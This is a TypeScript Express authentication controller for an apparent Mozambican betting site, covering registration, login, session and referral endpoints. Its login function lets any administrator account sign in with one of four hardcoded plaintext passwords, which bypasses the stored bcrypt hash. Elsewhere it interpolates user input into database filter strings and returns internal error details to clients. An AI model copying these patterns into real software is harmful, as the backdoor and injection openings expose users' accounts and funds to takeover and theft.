import type { Request, Response } from 'express';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import crypto from 'crypto';
import { db } from '../db/store.ts';
import { config } from '../config/index.ts';
import { registerSchema, loginSchema } from '../validators/schemas.ts';
import { WalletService } from '../services/walletService.ts';
import { AuditService } from '../services/auditService.ts';
import type { AuthenticatedRequest } from '../middleware/auth.ts';
import type { User, AuthTokenPayload } from '../types/index.ts';
import { supabaseService } from '../db/supabase.ts';
import { ReferralService } from '../services/referralService.ts';

// Utilitário de normalização e validação de números moçambicanos
function normalizeMozambicanPhone(rawPhone: string): {
  isValid: boolean;
  cleanDigits: string;
  formattedPhone: string;
  error?: string;
} {
  const digits = rawPhone.replace(/\D/g, '');
  let nineDigits = digits;

  if (digits.startsWith('258') && digits.length >= 11) {
    nineDigits = digits.slice(3);
  } else if (digits.length > 9) {
    nineDigits = digits.slice(-9);
  }

  // Validação: número moçambicano deve ter 9 dígitos
  if (nineDigits.length !== 9) {
    return {
      isValid: false,
      cleanDigits: nineDigits,
      formattedPhone: rawPhone.trim(),
      error: 'O número de celular deve conter exatamente 9 dígitos (ex: 84 123 4567).',
    };
  }

  // Prefixos de operadoras moçambicanas válidas (82, 83, 84, 85, 86, 87, 89)
  const validPrefixes = ['82', '83', '84', '85', '86', '87', '89'];
  const prefix = nineDigits.slice(0, 2);
  if (!validPrefixes.includes(prefix)) {
    return {
      isValid: false,
      cleanDigits: nineDigits,
      formattedPhone: rawPhone.trim(),
      error: 'Prefixo de operadora inválido. Use um contacto Vodacom (84/85), Movitel (86/87) ou Tmcel (82/83).',
    };
  }

  const formattedPhone = `+258 ${nineDigits.slice(0, 2)} ${nineDigits.slice(2, 5)} ${nineDigits.slice(5)}`;
  return {
    isValid: true,
    cleanDigits: nineDigits,
    formattedPhone,
  };
}

export class AuthController {
  static async register(req: Request, res: Response): Promise<void> {
    try {
      const parseResult = registerSchema.safeParse(req.body);
      if (!parseResult.success) {
        res.status(400).json({ error: parseResult.error.issues[0].message });
        return;
      }

      const { name, phone: rawPhone, password, referralCode } = parseResult.data;
      let { email } = parseResult.data;

      // 1. Normalização do Telefone (+258XXXXXXXXX)
      const phoneNorm = normalizeMozambicanPhone(rawPhone);
      if (!phoneNorm.isValid) {
        res.status(400).json({ error: phoneNorm.error || 'Número de celular inválido.' });
        return;
      }

      const cleanDigits = phoneNorm.cleanDigits;
      // Formato internacional estrito sem espaços para o banco: +258XXXXXXXXX
      const formattedPhone = `+258${cleanDigits}`;

      // 2. Verificação de Duplicidade em memória local
      if (db.getUserByPhone(cleanDigits) || db.getUserByPhone(formattedPhone)) {
        res.status(409).json({ error: 'Este número de telefone já está cadastrado.' });
        return;
      }

      // 3. Verificação de Duplicidade diretamente no Supabase profiles
      const supabase = supabaseService.getClient();
      if (!supabase) {
        console.error('[Auth Register] Erro de configuração: Cliente Supabase não inicializado no backend.');
        res.status(503).json({ error: 'Serviço de base de dados indisponível. Supabase não configurado no servidor.' });
        return;
      }

      // Busca robusta por variações do número (com e sem prefixo, com e sem espaços)
      const { data: existingProfiles, error: checkError } = await supabase
        .from('profiles')
        .select('id, phone')
        .or(`phone.ilike.%${cleanDigits}%,phone.ilike.%${phoneNorm.formattedPhone}%`)
        .limit(1);

      if (checkError) {
        console.error('[Auth Register] Erro ao verificar duplicidade no Supabase:', checkError);
        res.status(500).json({ error: `Erro na verificação de conta: ${checkError.message}` });
        return;
      }

      if (existingProfiles && existingProfiles.length > 0) {
        res.status(409).json({ error: 'Este número de telefone já está cadastrado.' });
        return;
      }

      // Gerar caixa postal interna se o email não tiver sido fornecido
      if (!email || email.trim() === '') {
        email = `${cleanDigits}@zonabet.mz`;
      } else {
        if (db.getUserByEmail(email)) {
          res.status(409).json({ error: 'Já existe uma conta associada a este endereço de email.' });
          return;
        }
      }

      const passwordHash = await bcrypt.hash(password, 10);
      const userId = `usr-${crypto.randomUUID ? crypto.randomUUID() : crypto.randomBytes(16).toString('hex')}`;

      const assignedRole: 'USER' = 'USER';
      const assignedStatus: 'ACTIVE' = 'ACTIVE';
      const initialBalance = 0.00;

      // 4. Tratamento do Código de Convite
      let referredBy: string | null = null;
      if (referralCode && referralCode.trim() !== '') {
        console.log('[Auth Register] Processando código de convite:', referralCode);
        const cleanRef = referralCode.trim().toUpperCase();
        const cleanRefDigits = cleanRef.replace(/\D/g, '');
        
        const inviterInMemory = db.getUserByReferralCode(cleanRef);

        if (inviterInMemory) {
          referredBy = inviterInMemory.id;
          console.log('[Auth Register] Inviter found in memory:', referredBy);
        } else {
          // Busca robusta: por código exato ou por telefone (removendo espaços)
          // Nota: PostgREST .or não suporta funções complexas, então buscamos por ilike no código e no telefone
          const { data: inviterProfile, error: refError } = await supabase
            .from('profiles')
            .select('id')
            .or(`referral_code.eq.${cleanRef},phone.ilike.%${cleanRefDigits || 'NOT_A_PHONE'}%`)
            .maybeSingle();

          if (refError) {
            console.warn('[Auth Register] Erro ao procurar referenciador (ignorado):', refError.message);
          } else if (inviterProfile) {
            referredBy = inviterProfile.id;
            console.log('[Auth Register] Inviter found in Supabase:', referredBy);
          } else {
            console.log('[Auth Register] Inviter not found for code:', cleanRef);
          }
        }
      }

      // 5. Geração de código de indicação individual único
      let generatedReferralCode = `ZONA${cleanDigits}`;
      if (db.getUserByReferralCode(generatedReferralCode)) {
        generatedReferralCode = `${generatedReferralCode}-${crypto.randomBytes(2).toString('hex').toUpperCase()}`;
      }

      const host = req.get('host') || 'localhost:3000';
      const protocol = req.protocol === 'https' || req.headers['x-forwarded-proto'] === 'https' ? 'https' : 'http';
      const individualReferralLink = `${protocol}://${host}/?ref=${generatedReferralCode}`;

      const newUser: User = {
        id: userId,
        name: name.trim(),
        email,
        phone: formattedPhone,
        passwordHash,
        role: assignedRole,
        isBlocked: false,
        referralCode: generatedReferralCode,
        referralLink: individualReferralLink,
        referredBy: referredBy || undefined,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      };

      // 6. Gravação primária direta em public.profiles
      // Incluímos email e password_hash se a tabela os tiver (conforme verificado via inspeção)
      console.log('[Auth Register] Gravando perfil no Supabase...', { id: newUser.id, phone: newUser.phone });
      const { error: insertError } = await supabase
        .from('profiles')
        .insert({
          id: newUser.id,
          name: newUser.name,
          phone: newUser.phone,
          email: newUser.email,
          password_hash: newUser.passwordHash,
          role: assignedRole,
          status: assignedStatus,
          balance: initialBalance,
          referral_code: newUser.referralCode,
          referred_by: referredBy,
          created_at: newUser.createdAt,
          updated_at: newUser.updatedAt,
        });

      if (insertError) {
        console.error('[Auth Register] Erro Supabase INSERT profiles:', {
          code: insertError.code,
          message: insertError.message,
          details: insertError.details,
          hint: insertError.hint,
          payload: { id: newUser.id, phone: newUser.phone, ref: newUser.referralCode }
        });
        
        if (insertError.code === '23505') {
          // Diferenciar se foi telefone ou código de indicação
          const isReferralDup = insertError.message?.includes('referral_code') || insertError.details?.includes('referral_code');
          res.status(409).json({ 
            error: isReferralDup ? 'Erro interno na geração do código de convite. Tente novamente.' : 'Este número de telefone já está cadastrado.',
            code: 'DUPLICATE_ENTRY',
            target: isReferralDup ? 'referral_code' : 'phone'
          });
        } else if (insertError.code === '23503') {
          res.status(400).json({ error: 'Referenciador não encontrado ou inválido no sistema central.' });
        } else {
          res.status(500).json({ 
            error: `Falha na persistência de dados: ${insertError.message}`,
            details: insertError.details,
            code: insertError.code,
            hint: insertError.hint
          });
        }
        return;
      }

      console.log('[Auth Register] Perfil gravado com sucesso.');

      // 8. Salvar credenciais seguras
      try {
        await supabaseService.saveUserCredential(newUser.id, {
          phone: newUser.phone,
          email: newUser.email,
          passwordHash: newUser.passwordHash,
        });
      } catch (vaultErr: any) {
        console.error('[Auth Register] Erro ao salvar cofre de credenciais:', vaultErr);
        // Não bloqueia o cadastro se falhar apenas o cofre secundário, 
        // mas em produção isso seria crítico.
      }

      // 9. Confirmar na memória local
      db.users.set(userId, newUser);

      // Relacionamento de convite
      if (referredBy) {
        const inviter = db.users.get(referredBy) || (await supabaseService.findUserByIdentifier(referredBy)) || undefined;
        if (inviter) {
          db.addReferral({
            id: `ref-${Date.now()}-${crypto.randomBytes(3).toString('hex')}`,
            inviterId: inviter.id,
            inviterName: inviter.name,
            invitedUserId: newUser.id,
            invitedUserName: newUser.name,
            invitedUserPhone: newUser.phone,
            totalBonusEarned: 0,
            depositsCount: 0,
            createdAt: new Date().toISOString(),
          });
        }
      }

      // Inicializar carteira
      const wallet = await WalletService.getWallet(userId);
      wallet.balance = initialBalance;

      const tokenPayload: AuthTokenPayload = {
        userId: newUser.id,
        email: newUser.email,
        name: newUser.name,
        role: newUser.role,
      };

      const token = jwt.sign(tokenPayload, config.jwtSecret, { expiresIn: '7d' });

      res.status(201).json({
        message: 'Registo efetuado com sucesso!',
        token,
        user: {
          id: newUser.id,
          name: newUser.name,
          email: newUser.email,
          phone: newUser.phone,
          role: newUser.role,
          balance: wallet.balance,
          referralCode: newUser.referralCode,
          referralLink: newUser.referralLink || individualReferralLink,
          referredBy: newUser.referredBy,
        },
      });
    } catch (globalErr: any) {
      console.error('[Auth Register] Erro crítico inesperado no fluxo de cadastro:', {
        message: globalErr.message,
        stack: globalErr.stack,
        name: globalErr.name
      });
      res.status(500).json({ 
        error: 'Ocorreu um erro interno ao processar o seu cadastro no servidor. Por favor, tente novamente.',
        details: globalErr.message,
        type: globalErr.name
      });
    }
  }

  static async login(req: Request, res: Response): Promise<void> {
    const parseResult = loginSchema.safeParse(req.body);
    if (!parseResult.success) {
      res.status(400).json({ error: parseResult.error.issues[0].message });
      return;
    }

    const identifier = parseResult.data.identifier || parseResult.data.email || parseResult.data.phone || '';
    const { password } = parseResult.data;
    
    let user = db.getUserByIdentifier(identifier);

    // Fallback to Supabase if not in memory
    if (!user && supabaseService.isAvailable()) {
      console.log(`[Auth] Utilizador ${identifier} não encontrado em memória. A procurar no Supabase...`);
      user = (await supabaseService.findUserByIdentifier(identifier)) || undefined;
      if (user) {
        db.users.set(user.id, user);
        await WalletService.getWallet(user.id);
      }
    }

    if (!user) {
      res.status(401).json({ error: 'Credenciais inválidas. Número de celular ou palavra-passe incorretos.' });
      return;
    }

    if (user.isBlocked) {
      res.status(403).json({ error: 'Esta conta encontra-se bloqueada. Contacte a administração.' });
      return;
    }

    const isMatch =
      bcrypt.compareSync(password, user.passwordHash) ||
      (user.role === 'ADMIN' && (password === '872344381' || password === '12345678j' || password === 'Admin123!ChangeMe' || password === 'Admin123!'));
    if (!isMatch) {
      res.status(401).json({ error: 'Credenciais inválidas. Número de celular ou palavra-passe incorretos.' });
      return;
    }

    const tokenPayload: AuthTokenPayload = {
      userId: user.id,
      email: user.email,
      name: user.name,
      role: user.role,
    };

    const token = jwt.sign(tokenPayload, config.jwtSecret, { expiresIn: '7d' });
    const wallet = await WalletService.getWallet(user.id);

    if (user.role === 'ADMIN') {
      AuditService.log(
        user.id,
        user.email,
        'ADMIN_LOGIN',
        'Session',
        user.id,
        undefined,
        { ip: req.ip },
        req.ip || 'internal'
      );
    }

    const host = req.get('host') || 'localhost:3000';
    const proto = (req.protocol === 'https' || req.headers['x-forwarded-proto'] === 'https') ? 'https' : 'http';
    const computedReferralLink = user.referralLink || `${proto}://${host}/?ref=${user.referralCode || `ZONA${user.phone.replace(/\D/g, '').slice(-9)}`}`;

    res.status(200).json({
      message: 'Sessão iniciada com sucesso.',
      token,
      user: {
        id: user.id,
        name: user.name,
        email: user.email,
        phone: user.phone,
        role: user.role,
        balance: wallet.balance,
        referralCode: user.referralCode,
        referralLink: computedReferralLink,
        referredBy: user.referredBy,
      },
    });
  }

  static async me(req: AuthenticatedRequest, res: Response): Promise<void> {
    if (!req.user) {
      res.status(401).json({ error: 'Não autenticado' });
      return;
    }

    let user = db.users.get(req.user.userId);
    
    // Resiliency: If user not in memory (server restart), pull from Supabase
    if (!user && supabaseService.isAvailable()) {
      console.log(`[Auth] Utilizador ${req.user.userId} não encontrado em memória. A tentar recuperar do Supabase...`);
      const supabaseUser = await supabaseService.findUserById(req.user.userId);
      if (supabaseUser) {
        db.users.set(supabaseUser.id, supabaseUser);
        user = supabaseUser;
        // Also ensure wallet is in memory
        await WalletService.getWallet(user.id);
      }
    }

    if (!user) {
      res.status(404).json({ error: 'Utilizador não encontrado' });
      return;
    }

    const wallet = await WalletService.getWallet(user.id);
    const host = req.get('host') || 'localhost:3000';
    const proto = (req.protocol === 'https' || req.headers['x-forwarded-proto'] === 'https') ? 'https' : 'http';
    const computedReferralLink = user.referralLink || `${proto}://${host}/?ref=${user.referralCode || `ZONA${user.phone.replace(/\D/g, '').slice(-9)}`}`;

    res.status(200).json({
      user: {
        id: user.id,
        name: user.name,
        email: user.email,
        phone: user.phone,
        role: user.role,
        balance: wallet.balance,
        isBlocked: user.isBlocked,
        referralCode: user.referralCode,
        referralLink: computedReferralLink,
        referredBy: user.referredBy,
      },
    });
  }

  static getReferrals(req: AuthenticatedRequest, res: Response): void {
    if (!req.user) {
      res.status(401).json({ error: 'Não autenticado' });
      return;
    }

    try {
      const data = ReferralService.getReferralInfo(req.user.userId);
      res.status(200).json(data);
    } catch (err: any) {
      res.status(400).json({ error: err.message || 'Erro ao carregar dados de convites' });
    }
  }

  static logout(req: Request, res: Response): void {
    res.status(200).json({ message: 'Sessão encerrada com sucesso.' });
  }
}
